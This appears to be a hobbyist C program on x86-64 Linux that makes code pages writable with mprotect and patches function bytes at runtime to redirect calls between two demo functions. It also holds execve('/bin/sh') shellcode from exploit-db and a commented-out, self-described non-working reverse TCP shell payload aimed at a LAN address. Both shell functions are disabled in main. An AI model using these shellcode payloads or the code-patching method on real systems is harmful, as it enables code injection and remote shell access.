#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>

void foo(void);
void bar(void);
int change_page_permissions_of_address(void *addr);

void print_hex_memory(void *mem,int size) {
	int i;
	unsigned char *p = (unsigned char *)mem;
	for (i=0;i<size;i++) {
		printf("0x%02x ", p[i]);
		if ((i%16==0) && i)
			printf("\n");
	}
	printf("\n");
}

int change_func_to_call(void *addr1,void *addr2) {
	// Change the permissions of the page that contains the first function to read, write, and execute
	// This assumes that the function is fully contained by a single page
	if(change_page_permissions_of_address(addr1) == -1) {
		fprintf(stderr, "Error while changing page permissions: %s\n", strerror(errno));
		return 1;
	}

	char call_func[] =
		"\x55"										// push   %rbp
		"\x48\x89\xe5"								// mov    %rsp,%rbp
		"\xb8\x00\x00\x00\x00" 						// mov    $0x0,%eax
		"\xe8\x00\x00\x00\x00"						// callq  (to fill later)
		"\x90"										// nop
		"\x5d"										// pop %rbp 
		"\xc3";										// retq

	// We need to calculate the value that the callq will use to jump
	// To do that, we take the current address that we will be at when we reach the callq
	// Witch is addr1 + 9 bytes of instruction before the callq
	// And 5 more bytes for the callq instruction itself
	// And we remove it from the address of the other function to get the value
	int call_off = addr2-(addr1+14);

	// We calculate the little endian 4 byte representation
	char bytes[4];
	bytes[3] = (call_off>>24)&0xFF;
	bytes[2] = (call_off>>16)&0xFF;
	bytes[1] = (call_off>>8)&0xFF;
	bytes[0] = call_off&0xFF;
	// Then we replace the placeholder value for the callq with it
	memcpy(call_func+10, bytes, sizeof(bytes));

	// Careful with the length of the shellcode here depending on what is after the function
	memcpy(addr1, call_func, sizeof(call_func)-1);

	return 0;
}

//Same deal as call but with jmp instead
int change_func_to_jmp(void *addr1,void *addr2) {

	if(change_page_permissions_of_address(addr1) == -1) {
		fprintf(stderr, "Error while changing page permissions: %s\n", strerror(errno));
		return 1;
	}

	char call_func[] =
		"\x55"										// push   %rbp
		"\x48\x89\xe5"								// mov    %rsp,%rbp
		"\xb8\x00\x00\x00\x00" 						// mov    $0x0,%eax
		"\xe9\x00\x00\x00\x00"						// jmpq  (to fill later)
		"\x90"										// nop
		"\x5d"										// pop %rbp 
		"\xc3";										// retq

	int call_off = addr2-(addr1+14);

	char bytes[4];
	bytes[3] = (call_off>>24)&0xFF;
	bytes[2] = (call_off>>16)&0xFF;
	bytes[1] = (call_off>>8)&0xFF;
	bytes[0] = call_off&0xFF;

	memcpy(call_func+10, bytes, sizeof(bytes));

	memcpy(addr1, call_func, sizeof(call_func)-1);

	return 0;
}

int drop_shell(void *addr) {
	// Change the permissions of the page that contains the function to read, write, and execute
	// This assumes that the function is fully contained by a single page
	if(change_page_permissions_of_address(addr) == -1) {
		fprintf(stderr, "Error while changing page permissions: %s\n", strerror(errno));
		return 1;
	}

	// http://www.exploit-db.com/exploits/13691/
	char shellcode[] =
		"\x48\x31\xd2"                              // xor    %rdx, %rdx
		"\x48\x31\xc0"                              // xor    %rax, %rax
		"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // mov    $0x68732f6e69622f2f, %rbx
		"\x53"                                      // push   %rbx
		"\x48\x89\xe7"                              // mov    %rsp, %rdi
		"\x50"                                      // push   %rax
		"\x57"                                      // push   %rdi
		"\x48\x89\xe6"                              // mov    %rsp, %rsi
		"\xb0\x3b"                                  // mov    $0x3b, %al
		"\x0f\x05";                                 // syscall

	// Careful with the length of the shellcode here depending on what is after the function
	memcpy(addr, shellcode, sizeof(shellcode)-1);

	return 0;
}
/* NOT WORKING
  Most likely paylod doesn't work
int drop_reverse_shell(void *addr) {
	//Reverse TCP Shell took from http://shell-storm.org/shellcode/files/shellcode-857.php
	unsigned char ip[] =  "\xc0\xa8\x01\x18"; 	// 192.168.1.24 use ip_hex.py to make ip
	int port = 31337;
	unsigned char shell[] =
		"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
		"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
		"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
		"\x02\x00\x00\xc7\x44\x24\x04\x00\x00\x00\x00\x48\x89\xe6\x6a\x10"
		"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
		"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
		"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
		"\x5f\x6a\x3b\x58\x0f\x05";
	for (int i=0;i<sizeof(shell);i++) {
		if(change_page_permissions_of_address(addr+i) == -1) {
			fprintf(stderr, "Error while changing page permissions: %s\n", strerror(errno));
			return 1;
		}
	}
	print_hex_memory(shell+49,2);
	print_hex_memory(shell+55,4);
	shell[49] = (port)&0xFF;
	shell[50] = (port>>8)&0xFF;
	printf("%i\n", shell[54]);
	memcpy(shell+54,ip,sizeof(ip));
	memcpy(addr,shell,sizeof(shell)-1);
	//int (*ret)() = (int(*)())shell;
	//ret();
	printf("s\n");

}
*/
// Not much comments because most of it is explained further up
int replace_call(void *from,void *faddr,void *taddr) {
	char bytes[4];
	int i=0,retq_hit=0;
	while (!retq_hit) {
		if (!strncmp(from+i,"\xc3",1)) {retq_hit=1;break;}
		int call_off = faddr-((from+i)+5);
		bytes[3] = (call_off>>24)&0xFF;
		bytes[2] = (call_off>>16)&0xFF;
		bytes[1] = (call_off>>8)&0xFF;
		bytes[0] = call_off&0xFF;
		if (!strncmp(from+i,"\xe8",1) && !strcmp(from+i+1,bytes)) {
			if(change_page_permissions_of_address(from+i) == -1) {
				fprintf(stderr, "Error while changing page permissions: %s\n", strerror(errno));
				return 1;
			}
			int call_off = taddr-((from+i)+5);
			bytes[3] = (call_off>>24)&0xFF;
			bytes[2] = (call_off>>16)&0xFF;
			bytes[1] = (call_off>>8)&0xFF;
			bytes[0] = call_off&0xFF;
			memcpy(from+i+1, bytes, sizeof(bytes));
		}
		i++;
	}
}

// Again everything is explained up top
int replace_all_call(void *from, void *taddr) {
	char bytes[4];
	int i=0,retq_hit=0;
	while (!retq_hit) {
		if (!strncmp(from+i,"\xc3",1)) {retq_hit=1;break;}
		if (!strncmp(from+i,"\xe8",1)) {
			if(change_page_permissions_of_address(from+i) == -1) {
				fprintf(stderr, "Error while changing page permissions: %s\n", strerror(errno));
				return 1;
			}
			int call_off = taddr-((from+i)+5);
			bytes[3] = (call_off>>24)&0xFF;
			bytes[2] = (call_off>>16)&0xFF;
			bytes[1] = (call_off>>8)&0xFF;
			bytes[0] = call_off&0xFF;
			memcpy(from+i+1, bytes, sizeof(bytes));
		}
		i++;
	}
}

int main(void) {
	// Call the unmodified foo()
	printf("Calling foo...\n");
	foo();

	//change_func_to_call((void*)foo,(void*)bar);
	//drop_shell((void*)foo);
	//drop_reverse_shell((void*)foo);
	replace_call((void*)main,(void*)foo,(void*)bar);
	//replace_all_call((void*)main,(void*)bar);

	// Call the modified foo()
	printf("Calling foo...\n");
	foo();

	return 0;
}

void bar(void) {
	printf("This is bar\n");
}

void foo(void) {
	printf("This is foo\n");
}

int change_page_permissions_of_address(void *addr) {
	// Move the pointer to the page boundary
	int page_size = getpagesize();
	addr -= (unsigned long)addr % page_size;

	if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}

	return 0;
}